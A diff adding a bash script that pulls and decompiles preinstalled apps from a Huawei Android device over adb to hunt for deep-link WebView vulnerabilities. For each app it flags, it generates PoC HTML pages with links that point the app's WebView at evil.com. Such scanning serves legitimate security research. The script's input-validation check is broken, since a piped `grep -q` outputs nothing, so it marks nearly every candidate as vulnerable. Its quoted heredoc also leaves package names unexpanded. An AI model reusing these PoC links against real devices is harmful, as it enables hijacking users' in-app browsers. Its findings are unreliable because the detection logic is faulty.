@@ -1,0 +1,205 @@
+#!/bin/bash
+# 华为设备 Deep Link 扫描脚本
+
+VENDOR="huawei"
+BATCH_SIZE=5
+REPORT_DIR="./${VENDOR}/reports"
+TEMP_DIR="./${VENDOR}/temp"
+APKS_DIR="./${VENDOR}/apks"
+
+mkdir -p "$REPORT_DIR" "$TEMP_DIR" "$APKS_DIR"
+
+echo "[INFO] 开始扫描华为系统预装应用..."
+echo "[INFO] 等待设备连接..."
+
+# 等待设备连接
+while true; do
+    DEVICES=$(adb devices | grep -v "List of" | grep -v "^$" | wc -l)
+    if [ "$DEVICES" -gt 0 ]; then
+        echo "[INFO] 设备已连接"
+        break
+    fi
+    echo "[WAIT] 等待设备连接..."
+    sleep 5
+done
+
+# 获取系统应用列表
+echo "[INFO] 获取系统应用列表..."
+adb shell pm list packages -s > "$TEMP_DIR/system_packages.txt"
+
+echo "[INFO] 共发现 $(cat "$TEMP_DIR/system_packages.txt" | wc -l) 个系统应用"
+
+# 分批处理
+BATCH_COUNT=0
+APP_COUNT=0
+TOTAL_VULNERABLE=0
+
+while read -r package_line; do
+    PACKAGE=$(echo "$package_line" | sed 's/package://')
+    APP_COUNT=$((APP_COUNT + 1))
+    BATCH_COUNT=$((BATCH_COUNT + 1))
+    
+    echo "[PROC] [$APP_COUNT] 分析包: $PACKAGE"
+    
+    # 获取 APK 路径
+    APK_PATH=$(adb shell pm path "$PACKAGE" | head -1 | sed 's/package://')
+    if [ -z "$APK_PATH" ]; then
+        echo "[SKIP] 无法获取 APK 路径"
+        continue
+    fi
+    
+    # 拉取 APK
+    echo "[INFO] 拉取 APK: $APK_PATH"
+    adb pull "$APK_PATH" "$TEMP_DIR/base.apk" 2>/dev/null
+    if [ ! -f "$TEMP_DIR/base.apk" ]; then
+        echo "[SKIP] APK 拉取失败"
+        continue
+    fi
+    
+    # 备份 APK
+    cp "$TEMP_DIR/base.apk" "$APKS_DIR/${PACKAGE}.apk"
+    
+    # 反编译
+    echo "[INFO] 反编译中..."
+    jadx -d "$TEMP_DIR/src" --no-assets "$TEMP_DIR/base.apk" 2>/dev/null
+    
+    # 检查反编译结果
+    if [ ! -d "$TEMP_DIR/src" ] || [ -z "$(ls -A "$TEMP_DIR/src" 2>/dev/null)" ]; then
+        echo "[SKIP-ODEX] 反编译失败，可能是 ODEX 优化应用"
+        rm -rf "$TEMP_DIR/src"
+        rm -f "$TEMP_DIR/base.apk"
+        continue
+    fi
+    
+    # 查找 AndroidManifest.xml
+    MANIFEST="$TEMP_DIR/src/AndroidManifest.xml"
+    if [ ! -f "$MANIFEST" ]; then
+        MANIFEST=$(find "$TEMP_DIR/src" -name "AndroidManifest.xml" | head -1)
+    fi
+    
+    if [ -z "$MANIFEST" ]; then
+        echo "[SKIP] 未找到 AndroidManifest.xml"
+        rm -rf "$TEMP_DIR/src" "$TEMP_DIR/base.apk"
+        continue
+    fi
+    
+    # 分析 Manifest - 查找 Deep Link 入口
+    echo "[INFO] 分析 AndroidManifest.xml..."
+    SCHEMES=$(grep -o 'android:scheme="[^"]*"' "$MANIFEST" | sed 's/android:scheme="//g; s/"//g' | sort -u)
+    
+    if [ -z "$SCHEMES" ]; then
+        echo "[SAFE] 未发现 Deep Link Scheme"
+        rm -rf "$TEMP_DIR/src" "$TEMP_DIR/base.apk"
+        continue
+    fi
+    
+    echo "[INFO] 发现 Schemes: $SCHEMES"
+    
+    # 查找包含 BROWSABLE 的 Activity
+    BROWSABLE_ACTIVITIES=$(grep -B5 'BROWSABLE' "$MANIFEST" | grep -o 'android:name="[^"]*"' | sed 's/android:name="//g; s/"//g' | sort -u)
+    
+    if [ -z "$BROWSABLE_ACTIVITIES" ]; then
+        echo "[SAFE] 未发现 BROWSABLE Activity"
+        rm -rf "$TEMP_DIR/src" "$TEMP_DIR/base.apk"
+        continue
+    fi
+    
+    echo "[INFO] 发现 BROWSABLE Activities: $BROWSABLE_ACTIVITIES"
+    
+    # 查找 loadUrl 调用
+    echo "[INFO] 搜索 WebView.loadUrl 调用..."
+    LOADURL_FILES=$(find "$TEMP_DIR/src" -name "*.java" -exec grep -l "loadUrl" {} \; 2>/dev/null)
+    
+    if [ -z "$LOADURL_FILES" ]; then
+        echo "[SAFE] 未发现 loadUrl 调用"
+        rm -rf "$TEMP_DIR/src" "$TEMP_DIR/base.apk"
+        continue
+    fi
+    
+    echo "[INFO] 发现 loadUrl 文件: $(echo "$LOADURL_FILES" | wc -l) 个"
+    
+    # 漏洞分析 - 检查 Source -> Sink 通路
+    VULNERABLE=0
+    for java_file in $LOADURL_FILES; do
+        # 检查 Intent 获取
+        if grep -q "getIntent()" "$java_file" || grep -q "getData()" "$java_file" || grep -q "getQueryParameter" "$java_file"; then
+            # 检查是否有校验
+            if ! grep -q "equals\|startsWith\|contains.*http" "$java_file" | grep -q "if"; then
+                echo "[VULNERABLE] 发现潜在漏洞: $java_file"
+                VULNERABLE=1
+                
+                # 提取关键代码
+                echo "--- 漏洞代码片段 ---" >> "$REPORT_DIR/${PACKAGE}_vuln.txt"
+                grep -n "loadUrl\|getIntent\|getData\|getQueryParameter" "$java_file" >> "$REPORT_DIR/${PACKAGE}_vuln.txt"
+                echo "" >> "$REPORT_DIR/${PACKAGE}_vuln.txt"
+            fi
+        fi
+    done
+    
+    if [ $VULNERABLE -eq 1 ]; then
+        TOTAL_VULNERABLE=$((TOTAL_VULNERABLE + 1))
+        
+        # 生成 PoC HTML
+        cat > "$REPORT_DIR/${PACKAGE}_poc.html" << 'POC_EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Deep Link PoC - $PACKAGE</title>
+</head>
+<body>
+    <h1>Deep Link 漏洞 PoC</h1>
+    <p><strong>包名:</strong> $PACKAGE</p>
+    <p><strong>测试链接:</strong></p>
+    <ul>
+POC_EOF
+        
+        # 添加 Scheme 链接
+        for scheme in $SCHEMES; do
+            echo "        <li><a href=\"$scheme://webview?url=http://evil.com\">$scheme://webview?url=http://evil.com</a></li>" >> "$REPORT_DIR/${PACKAGE}_poc.html"
+        done
+        
+        cat >> "$REPORT_DIR/${PACKAGE}_poc.html" << 'POC_EOF'
+    </ul>
+    <hr>
+    <p><em>Generated by Android Deep Link Scanner</em></p>
+</body>
+</html>
+POC_EOF
+        
+        echo "[REPORT] 漏洞报告已生成: $REPORT_DIR/${PACKAGE}_poc.html"
+    fi
+    
+    # 清理临时文件
+    rm -rf "$TEMP_DIR/src" "$TEMP_DIR/base.apk"
+    
+    # 批次检查
+    if [ $BATCH_COUNT -ge $BATCH_SIZE ]; then
+        echo ""
+        echo "========================================="
+        echo "[BATCH COMPLETE] 本批处理完成"
+        echo "  已分析: $APP_COUNT 个应用"
+        echo "  发现漏洞: $TOTAL_VULNERABLE 个"
+        echo "========================================="
+        echo ""
+        echo "输入 'continue' 继续下一批，或 'stop' 停止扫描"
+        
+        # 等待用户输入
+        read -r USER_INPUT
+        if [ "$USER_INPUT" = "stop" ]; then
+            echo "[INFO] 扫描已停止"
+            break
+        fi
+        
+        BATCH_COUNT=0
+    fi
+    
+done < "$TEMP_DIR/system_packages.txt"
+
+# 最终报告
+echo ""
+echo "========================================="
+echo "[SCAN COMPLETE] 扫描完成"
+echo "  总分析: $APP_COUNT 个应用"
+echo "  漏洞总数: $TOTAL_VULNERABLE 个"
+echo "  报告目录: $REPORT_DIR"
+echo "========================================="
